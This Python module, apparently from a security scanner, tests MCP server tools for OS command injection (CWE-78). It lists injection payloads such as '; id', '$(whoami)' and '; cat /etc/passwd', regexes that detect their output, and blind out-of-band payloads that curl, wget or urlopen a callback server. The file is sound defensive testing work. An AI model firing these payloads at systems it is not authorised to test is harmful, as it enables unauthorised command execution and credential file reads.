"""
Command Injection Module
Targets: MCP tools that execute shell commands or accept shell-like parameters.
Method: Injects OS command separators into string parameters and checks if
        command output appears in the server response.
CWE-78: OS Command Injection
"""

import re
import asyncio
from mcp import ClientSession
from mcp.types import CallToolResult

from .base import ScanModule
from ..models import Finding, FindingStatus, Severity

_OOB_WAIT = 3.0


# Parameters whose names unambiguously suggest OS command execution.
# "input" and "query" are intentionally excluded — they are generic names used
# by SQL tools, search tools, and form inputs; they do not imply shell execution.
# Including them caused every database/search MCP tool to be tested for command
# injection, generating high FP rates globally.
CMD_PARAM_NAMES = [
    "command", "cmd", "exec", "run", "shell", "args",
    "expression", "code", "script",
]

# Tool names suggesting shell/command execution
CMD_TOOL_KEYWORDS = [
    "exec", "run", "shell", "bash", "cmd", "command",
    "execute", "eval", "process", "invoke",
]

# Injection payloads — each appends a known-output command
INJECTION_PAYLOADS = [
    "; id",
    "| id",
    "`id`",
    "$(id)",
    "&& id",
    "\nid\n",
    "; whoami",
    "| whoami",
    "$(whoami)",
    "; cat /etc/passwd",
    "; uname -a",
]

# Evidence patterns that confirm command execution.
# Each pattern must be unambiguous — it should be physically impossible for a
# legitimate MCP tool response to produce this output unless a shell command ran.
INJECTION_EVIDENCE_PATTERNS = [
    re.compile(r"uid=\d+\(\w+\)\s+gid=\d+"),        # id command: uid=0(root) gid=0(root)
    re.compile(r"uid=\d+ gid=\d+ groups=\d+"),       # id --brief variant
    re.compile(r"Linux\s+\S+\s+\d+\.\d+\.\d+\s+#"), # uname -a (kernel version with build #)
    re.compile(r"root:.*:/bin/(bash|sh)"),            # /etc/passwd root entry
    # passwd format: requires 6 colon-separated fields to avoid matching CSV/config data
    re.compile(r"^[a-z_][a-z0-9_-]*:[x*!]:\d+:\d+:[^:]*:[^:]+:/\w+", re.MULTILINE),
    # Windows: cmd.exe ver command output — requires the exact "Microsoft Windows [Version X.Y]" format
    re.compile(r"Microsoft Windows \[Version \d+\.\d+"),
    re.compile(r"WINDIR="),                           # Windows env dump — very specific
]


def _extract_text(result: CallToolResult) -> str:
    parts = []
    for item in result.content:
        if hasattr(item, "text"):
            parts.append(item.text)
        elif isinstance(item, dict) and "text" in item:
            parts.append(item["text"])
    return "\n".join(parts)


def _check_evidence(response_text: str) -> str | None:
    for pattern in INJECTION_EVIDENCE_PATTERNS:
        match = pattern.search(response_text)
        if match:
            start = max(0, match.start() - 10)
            end = min(len(response_text), match.end() + 100)
            return response_text[start:end].strip()
    return None


def _is_command_tool(tool: dict) -> bool:
    name = tool.get("name", "").lower()
    desc = tool.get("description", "").lower()
    schema = tool.get("inputSchema", {})
    param_names = [k.lower() for k in schema.get("properties", {}).keys()]

    # Tool name or description suggests command execution
    for keyword in CMD_TOOL_KEYWORDS:
        if keyword in name or keyword in desc:
            return True

    # Has a command-like parameter
    return any(p in param_names for p in CMD_PARAM_NAMES)


def _get_injectable_params(tool: dict) -> list[str]:
    """
    Return the parameters that should receive injection payloads for this tool.

    Priority order:
    1. Parameters whose names are in CMD_PARAM_NAMES (e.g. "command", "cmd", "shell").
       If any exist, test ONLY these — they are the actual injection points.
    2. If no CMD_PARAM_NAMES params exist (tool was selected by name/description
       keywords, not param names), test all string-type params — one of them must
       be accepting the command string since the tool is identified as a shell tool.

    This prevents blasting injection payloads at every string parameter on a tool
    like `shell_execute(command: str, output_format: str, timeout: int)` — only
    `command` should be tested, not `output_format`.
    """
    schema = tool.get("inputSchema", {})
    properties = schema.get("properties", {})

    # Priority 1: explicit command-named params
    cmd_named = [name for name in properties if name.lower() in CMD_PARAM_NAMES]
    if cmd_named:
        return cmd_named

    # Priority 2: all string params (tool has no cmd-named param but is a shell tool by name/desc)
    return [name for name, spec in properties.items() if spec.get("type") == "string"]


class CommandInjectionModule(ScanModule):
    module_id = "command_injection"
    name = "Command Injection"
    description = "Tests MCP tools that execute shell commands for OS command injection (CWE-78) by appending shell separators and checking for command output in responses"

    async def run(self, session: ClientSession, tools: list[dict]) -> list[Finding]:
        findings: list[Finding] = []
        cb = self.callback_server  # May be None if scanner didn't inject it

        for tool in tools:
            if not _is_command_tool(tool):
                continue

            tool_name = tool["name"]
            injectable_params = _get_injectable_params(tool)
            if not injectable_params:
                continue

            for param in injectable_params:
                confirmed = False

                # Phase 1: Response-based detection
                for payload in INJECTION_PAYLOADS:
                    try:
                        result = await session.call_tool(
                            tool_name,
                            arguments={param: f"test{payload}"}
                        )
                        response_text = _extract_text(result)
                        evidence = _check_evidence(response_text)

                        if evidence:
                            findings.append(Finding(
                                module_id=self.module_id,
                                title=f"OS Command Injection in '{tool_name}' via '{param}' parameter",
                                severity=Severity.CRITICAL,
                                status=FindingStatus.CONFIRMED,
                                cvss_score=9.8,
                                description=(
                                    f"The MCP tool '{tool_name}' is vulnerable to OS command injection "
                                    f"via the '{param}' parameter. Injecting shell metacharacters executes "
                                    f"arbitrary commands on the server with the server process's privileges."
                                ),
                                tool_name=tool_name,
                                payload_used=f"test{payload}",
                                evidence=f"Command output in response: {evidence}",
                                remediation=(
                                    "Never pass user-controlled input to shell functions (os.system, "
                                    "subprocess with shell=True, eval). Use subprocess with a list of "
                                    "arguments (shell=False) and validate/allowlist all inputs."
                                ),
                                raw_request={"tool": tool_name, "arguments": {param: f"test{payload}"}},
                                raw_response=response_text[:1000],
                                cwe_id="CWE-78",
                            ))
                            confirmed = True
                            break  # One confirmed finding per param is enough

                    except Exception:
                        pass  # Errors without useful evidence are not findings

                # Phase 2: Blind OOB detection via callback server
                # Only try if Phase 1 didn't already confirm the vulnerability
                if not confirmed and cb is not None:
                    token = cb.new_token()
                    cb_url = cb.url("cmd", token)
                    # Try curl, wget, and Python-based callbacks to maximise OS coverage
                    oob_payloads = [
                        f"; curl -s {cb_url}",
                        f"| curl -s {cb_url}",
                        f"$(curl -s {cb_url})",
                        f"; wget -q -O /dev/null {cb_url}",
                        f"; python3 -c \"import urllib.request; urllib.request.urlopen('{cb_url}')\"",
                        f"; python -c \"import urllib; urllib.urlopen('{cb_url}')\"",
                    ]
                    for oob_payload in oob_payloads:
                        try:
                            await asyncio.wait_for(
                                session.call_tool(tool_name, arguments={param: f"test{oob_payload}"}),
                                timeout=10
                            )
                        except Exception:
                            pass
                        # Check after each attempt — stop as soon as we get a hit
                        await asyncio.sleep(_OOB_WAIT)
                        hit = cb.was_hit(token)
                        if hit:
                            findings.append(Finding(
                                module_id=self.module_id,
                                title=f"Blind OS Command Injection (OOB) in '{tool_name}' via '{param}'",
                                severity=Severity.CRITICAL,
                                status=FindingStatus.CONFIRMED,
                                cvss_score=9.8,
                                description=(
                                    f"The MCP tool '{tool_name}' is vulnerable to blind OS command injection "
                                    f"via the '{param}' parameter. The injected command made an outbound "
                                    f"HTTP request to our callback server, confirming arbitrary command "
                                    f"execution even though output is not returned in the tool response."
                                ),
                                tool_name=tool_name,
                                payload_used=f"test{oob_payload}",
                                evidence=(
                                    f"OOB callback received at {hit.received_at} — "
                                    f"method={hit.method}, path={hit.path}"
                                ),
                                remediation=(
                                    "Never pass user-controlled input to shell functions (os.system, "
                                    "subprocess with shell=True, eval). Use subprocess with a list of "
                                    "arguments (shell=False) and validate/allowlist all inputs."
                                ),
                                raw_request={"tool": tool_name, "arguments": {param: f"test{oob_payload}"}},
                                raw_response=f"OOB callback received: {hit.method} {hit.path}",
                                cwe_id="CWE-78",
                            ))
                            break

        return findings
